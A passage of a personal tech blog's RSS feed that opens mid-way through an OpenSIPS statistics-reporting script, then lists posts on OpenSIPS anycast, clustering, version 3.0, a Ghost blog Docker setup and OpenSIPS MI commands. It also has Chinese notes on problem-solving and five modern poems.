&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    update_stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;packet:total_size&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ml&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# message length&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 响应路由&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;onreply_route &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    update_stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;packet:count&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    update_stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;packet:total_size&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ml&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 定时器路由，定时通过HTTP发请求&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;timer_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;daily_stat_push, 86400&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;all_stats&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; :&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;method\&amp;#34;: {}, \&amp;#34;packet\&amp;#34;: {}}&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# pack and clear all method-related statistics&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    stat_iter_init&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;method&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;iter&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;stat_iter_next&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(key)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(val)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;iter&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;all_stats/method/$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;key&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;val&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        reset_stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(key)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# pack and clear all packet-related statistics&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    stat_iter_init&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;packet&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;iter&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;stat_iter_next&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(key)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(val)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;iter&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;all_stats/packet/$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;key&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;val&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        reset_stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(key)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# push the data to our web server&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!rest_post&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://WEB_SERVER&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$json&lt;span style=&#34;color:#e6db74&#34;&gt;(all_stats)&amp;#34;&lt;/span&gt;, , &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(out_body)&amp;#34;&lt;/span&gt;, , &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(status)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ERROR: during HTTP POST, &lt;/span&gt;$json&lt;span style=&#34;color:#e6db74&#34;&gt;(all_stats)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;status&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ERROR: web server returned &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(status), &lt;/span&gt;$json&lt;span style=&#34;color:#e6db74&#34;&gt;(all_stats)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Full Anycast support in OpenSIPS 2.4</title>
      <link>https://wdd.js.org/opensips/blog/full-anycast/</link>
      <pubDate>Wed, 31 Jul 2019 13:37:31 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/full-anycast/</guid>
      <description>&lt;p&gt;he advantages of doing Load Balancing and High Availability **without **any particular requirements from the clients side are starting to make Anycast IPs more and more appealing in the VoIP world. But are you actually using the best out of it? This article describes how you can use OpenSIPS 2.4 to make the best use of an anycast environment.&lt;!-- raw HTML omitted --&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Anycast&#34;&gt;Anycast&lt;/a&gt; is a UDP-based special network setup where a single IP is assigned to multiple nodes, each of them being able to actively use it (as opposed to a VRRP setup, where only one instance can use the IP). When a packet reaches the network with an anycast destination, the router sends it to the “closest” node, based on different metrics (application status, network latency, etc). This behavior ensures that traffic is (1) &lt;strong&gt;balanced&lt;/strong&gt; by sending it to one of the least busy nodes (based on application status) and also ensures (2) &lt;strong&gt;geo-distribution&lt;/strong&gt;, by sending the request to the closest node (based on latency). Moreover, if a node goes down, it will be completely put out of route, ensuring (3) &lt;strong&gt;high availability&lt;/strong&gt; for your platform. All these features without any special requirements from your customers, all they need is to send traffic to the anycast IP.&lt;!-- raw HTML omitted --&gt;Sounds wonderful, right? It really is! And if you are running using anycast IPs in a transaction stateless mode, things just work out of the box.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Clustering ongoing calls with OpenSIPS 2.4</title>
      <link>https://wdd.js.org/opensips/blog/cluster-call/</link>
      <pubDate>Wed, 31 Jul 2019 13:36:53 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/cluster-call/</guid>
      <description>&lt;p&gt;Dialog replication in OpenSIPS has been around since version 1.10, when it became clear that sharing real-time data through a database is no longer feasible in a large VoIP platform. Further steps in this direction have been made in 2.2, with the advent of the &lt;em&gt;&lt;strong&gt;clusterer&lt;/strong&gt;&lt;/em&gt; module, which manages OpenSIPS instances and their inter-communication. But have we been able to achieve the objective of a true and complete solution for &lt;em&gt;clustering&lt;/em&gt; dialog support? In this article we are going to look into the limitations of distributing ongoing calls in previous OpenSIPS versions and how we overcame them and added new possibilities in 2.4, based on the &lt;a href=&#34;https://blog.opensips.org/2018/03/13/the-new-clustering-engine-of-opensips-2-4/&#34;&gt;improved clustering engine&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Clustered SIP User Location: The Full Sharing Topology</title>
      <link>https://wdd.js.org/opensips/blog/cluster-location/</link>
      <pubDate>Wed, 31 Jul 2019 13:34:05 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/cluster-location/</guid>
      <description>&lt;p&gt;The distributed SIP user location support is one of the major features of the &lt;a href=&#34;https://blog.opensips.org/2017/11/01/introducing-opensips-2-4/&#34;&gt;latest stable OpenSIPS release&lt;/a&gt;, namely 2.4.  The aim of this extension of the OpenSIPS &lt;em&gt;&lt;a href=&#34;https://opensips.org/html/docs/modules/2.4.x/usrloc.html&#34;&gt;usrloc&lt;/a&gt;&lt;/em&gt; module is to provide a horizontally scalable solution that is easy to set up and maintain, while remaining flexible enough to cope with varying needs of each specific deployment.&lt;!-- raw HTML omitted --&gt;Throughout this text, by “data” we refer to SIP Addresses-of-Record (subscribers) and their dynamic SIP Contact bindings (network coordinates of their SIP devices) — all of these must be replicated across cluster nodes.  From a data sharing point of view, we can break the distributed user location support down in two major modes of usage:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Introducing OpenSIPS 3.0</title>
      <link>https://wdd.js.org/opensips/blog/opensips3x/</link>
      <pubDate>Wed, 31 Jul 2019 13:31:30 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/opensips3x/</guid>
      <description>&lt;p&gt;You already know the story – one more year, one more evolution cycle, one more OpenSIPS major release. Even more, a new OpenSIPS direction is about to start. So let me introduce you to the upcoming OpenSIPS 3.0 .&lt;!-- raw HTML omitted --&gt;For the upcoming OpenSIPS 3.0 release (and 3.x family) the main focus is on the **_devops _**concept. Shortly said, this translates into:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;making the OpenSIPS script writing/developing much easier&lt;/li&gt;
&lt;li&gt;simplifying the operational activities around OpenSIPS&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;What features and functionalities a software is able to deliver is a very important factor. Nevertheless, how easy to use and operate the software is, it;s a another factor with almost the same importance . Especially if we consider the case of OpenSIPS which is a very complex software to configure, to integrate and to operate in large scale multi-party platforms.&lt;/p&gt;</description>
    </item>
    <item>
      <title>解决问题的思维模式</title>
      <link>https://wdd.js.org/posts/2019/07/bq7ih4/</link>
      <pubDate>Tue, 30 Jul 2019 20:16:39 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/bq7ih4/</guid>
      <description>&lt;p&gt;问题分为两种，一种是搜索引擎能够找到答案的，另一种是搜索引擎找不到答案的。&lt;/p&gt;
&lt;p&gt;按照80-20原则，前者估计能占到80%，而后者能占到20%。&lt;/p&gt;
&lt;h1 id=&#34;1-搜索引擎的使用&#34;&gt;1 搜索引擎的使用&lt;/h1&gt;
&lt;h2 id=&#34;11-如何让搜索引擎更加理解你&#34;&gt;1.1 如何让搜索引擎更加理解你？&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你能理解搜索引擎，那么搜索引擎会更加理解你。&lt;/p&gt;&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;搜索引擎是基于关键词去搜索的，所以尽量给搜索引擎关键词，而不是大段的报错&lt;/li&gt;
&lt;li&gt;关键词的顺序很重要，把重要的关键词放在靠前的位置&lt;/li&gt;
&lt;li&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;12-如何提炼关键词&#34;&gt;1.2 如何提炼关键词？&lt;/h2&gt;
&lt;h2 id=&#34;13-不错的所搜引擎推荐&#34;&gt;1.3 不错的所搜引擎推荐？&lt;/h2&gt;
&lt;h1 id=&#34;2-当搜索引擎无法解决时&#34;&gt;2 当搜索引擎无法解决时？&lt;/h1&gt;
&lt;p&gt;当搜索引擎无法解决时，可以从哪些方面思考？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;拼写或者格式等错误&lt;/li&gt;
&lt;li&gt;上下文不理解，语境不清晰，断章取义&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>现代诗 五首 摘抄</title>
      <link>https://wdd.js.org/posts/2019/07/icwy4b/</link>
      <pubDate>Mon, 29 Jul 2019 22:20:59 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/icwy4b/</guid>
      <description>&lt;h1 id=&#34;梦与诗&#34;&gt;梦与诗&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;胡适&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt; &lt;!-- raw HTML omitted --&gt;醉过才知酒浓&lt;!-- raw HTML omitted --&gt;爱过才知情重&lt;!-- raw HTML omitted --&gt;你不能做我的诗&lt;!-- raw HTML omitted --&gt;正如我不能做你的梦&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;情歌&#34;&gt;情歌&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;刘半农&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;天上飘着些微云&lt;!-- raw HTML omitted --&gt;地上吹着些微风&lt;!-- raw HTML omitted --&gt;啊！&lt;!-- raw HTML omitted --&gt;微风吹动了我的头发&lt;!-- raw HTML omitted --&gt;教我如何不想她？&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;沙扬娜拉-赠日本女郎&#34;&gt;沙扬娜拉 赠日本女郎&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;徐志摩&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;最是那一低头的温柔&lt;!-- raw HTML omitted --&gt;像一朵水莲花不胜凉风的娇羞&lt;!-- raw HTML omitted --&gt;道一声珍重&lt;!-- raw HTML omitted --&gt;道一声珍重&lt;!-- raw HTML omitted --&gt;那一声珍重里有蜜甜的忧愁&lt;!-- raw HTML omitted --&gt;沙扬娜拉！&lt;/p&gt;</description>
    </item>
    <item>
      <title>ghost博客 固定feature博客</title>
      <link>https://wdd.js.org/posts/2019/07/ae4atc/</link>
      <pubDate>Mon, 22 Jul 2019 17:30:35 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/ae4atc/</guid>
      <description>&lt;h1 id=&#34;docker-ghost-安装&#34;&gt;Docker ghost 安装&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	docker run -d --name myghost -p 8090:2368 -e url&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http://172.16.200.228:8090/ &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;	-v /root/volumes/ghost:/var/lib/ghost/content ghost
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;模板修改&#34;&gt;模板修改&lt;/h1&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.ghostforbeginners.com/move-featured-posts-to-the-top-of-your-blog/&#34;&gt;https://www.ghostforbeginners.com/move-featured-posts-to-the-top-of-your-blog/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>核心MI命令</title>
      <link>https://wdd.js.org/opensips/ch3/core-mi/</link>
      <pubDate>Thu, 18 Jul 2019 13:54:58 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/core-mi/</guid>
      <description>&lt;p&gt;在所有的fifo命令中，which命令比较重要，因为它可以列出所有的其他命令。&lt;/p&gt;
&lt;p&gt;有些mi命令是存在于各个模块之中，所以加载的模块不通。opensipsctl fifo which输出的命令也不通。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;获取执行参数&lt;/th&gt;
          &lt;th&gt;opensipsctl fifo arg&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;列出TCP连接数量&lt;/td&gt;
          &lt;td&gt;opensipsctl fifo list_tcp_conns&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;查看进程信息&lt;/td&gt;
          &lt;td&gt;opensipsctl fifo ps&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;查看opensips运行时长&lt;/td&gt;
          &lt;td&gt;opensipsctl fifo uptime&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;查看所有支持的指令&lt;/td&gt;
          &lt;td&gt;opensipsctl fifo which&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;获取统计数据&lt;/td&gt;
          &lt;td&gt;opensipsctl fifo get_statistics rcv_requests&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;重置统计数据&lt;/td&gt;
          &lt;td&gt;opensipsctl fifo get_statistics received_replies&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;get_statistics
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reset_statistics
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uptime
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;version
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pwd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;arg
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;which
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ps
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kill
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;debug
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cache_store
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cache_fetch
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cache_remove
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;event_subscribe
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;events_list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;subscribers_list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;list_tcp_conns
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;help
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;list_blacklists
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;regex_reload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t_uac_dlg
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t_uac_cancel
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t_hash
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t_reply
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ul_rm
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ul_rm_contact
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ul_dump
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ul_flush
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ul_add
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ul_show_contact
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ul_sync
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;domain_reload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;domain_dump
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dlg_list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dlg_list_ctx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dlg_end_dlg
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dlg_db_sync
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dlg_restore_db
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;profile_get_size
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;profile_list_dlgs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;profile_get_values
